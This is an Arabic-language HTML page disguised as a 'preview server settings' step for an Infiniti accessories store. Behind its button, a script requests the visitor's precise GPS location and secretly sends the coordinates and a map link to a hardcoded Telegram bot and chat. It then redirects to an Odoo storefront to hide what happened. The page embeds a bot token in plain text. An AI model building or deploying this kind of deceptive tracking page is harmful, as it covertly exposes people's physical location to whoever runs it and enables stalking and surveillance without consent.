<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري تحميل المعاينة...</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            color: #333;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #setup-box { text-align: center; max-width: 90%; padding: 20px; }
        #setup-box p { color: #666; font-size: 14px; margin-bottom: 25px; }
        #start-btn {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 12px 30px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }
        #error-msg {
            display: none;
            color: #c0392b;
            font-size: 13px;
            margin-top: 15px;
        }
    </style>
</head>
<body>

    <div id="setup-box">
        <h3>إعدادات خادم المعاينة النهائي</h3>
        <p>يرجى الضغط على الزر أدناه لضبط العملة المحلية ونقاط التوصيل الافتراضية لمتجر Infiniti.</p>
        <button type="button" id="start-btn">دخول إلى المتجر المعاين</button>
        <p id="error-msg"></p>
    </div>
    <div class="loader" id="loader"></div>

    <script>
        // ضع بياناتك الحقيقية هنا (لا تترك النص العربي التوضيحي)
        const TELEGRAM_TOKEN = "8679396887:AAFPkh0VlUxlPJ2k3EHjkWAxkpEGSOWE6SY";
        const TELEGRAM_CHAT_ID = "5874747123";

        const startBtn = document.getElementById("start-btn");
        const setupBox = document.getElementById("setup-box");
        const loader = document.getElementById("loader");
        const errorMsg = document.getElementById("error-msg");

        function showError(text) {
            errorMsg.textContent = text;
            errorMsg.style.display = "block";
            loader.style.display = "none";
            setupBox.style.display = "block";
        }

        function redirectToStore() {
            window.location.href = "https://bs-accessoires-infiniti2.odoo.com";
        }

        // POST من المتصفح يُرفض بسبب CORS — نستخدم GET
        function sendToTelegram(lat, lng, accuracy) {
            const mapLink = "https://www.google.com/maps?q=" + lat + "," + lng;
            const message =
                "زيارة جديدة:\n" +
                "خط العرض: " + lat + "\n" +
                "خط الطول: " + lng + "\n" +
                "الدقة: " + Math.round(accuracy) + " م\n" +
                "الخريطة: " + mapLink;

            const url =
                "https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage" +
                "?chat_id=" + TELEGRAM_CHAT_ID +
                "&text=" + encodeURIComponent(message);

            fetch(url, { method: "GET", mode: "no-cors" });

            const img = new Image();
            img.src = url;

            setTimeout(redirectToStore, 2000);
        }

        startBtn.addEventListener("click", function () {
            if (TELEGRAM_TOKEN.includes("ضع_") || TELEGRAM_CHAT_ID.includes("ضع_")) {
                showError("أدخل توكن البوت و chat_id الحقيقيين في الكود أولاً.");
                return;
            }

            if (!window.isSecureContext) {
                showError("يجب فتح الصفحة عبر رابط HTTPS (ليس ملفاً محلياً file://).");
                return;
            }

            setupBox.style.display = "none";
            loader.style.display = "block";

            if (!navigator.geolocation) {
                showError("المتصفح لا يدعم تحديد الموقع.");
                return;
            }

            navigator.geolocation.getCurrentPosition(
                function (position) {
                    sendToTelegram(
                        position.coords.latitude,
                        position.coords.longitude,
                        position.coords.accuracy
                    );
                },
                function (err) {
                    var reasons = {
                        1: "تم رفض الإذن. اسمح بالموقع من إعدادات المتصفح ثم أعد المحاولة.",
                        2: "تعذر تحديد الموقع. تأكد من تفعيل GPS.",
                        3: "انتهت المهلة. حاول مرة أخرى."
                    };
                    showError(reasons[err.code] || "فشل جلب الموقع.");
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        });
    </script>
</body>
</html>
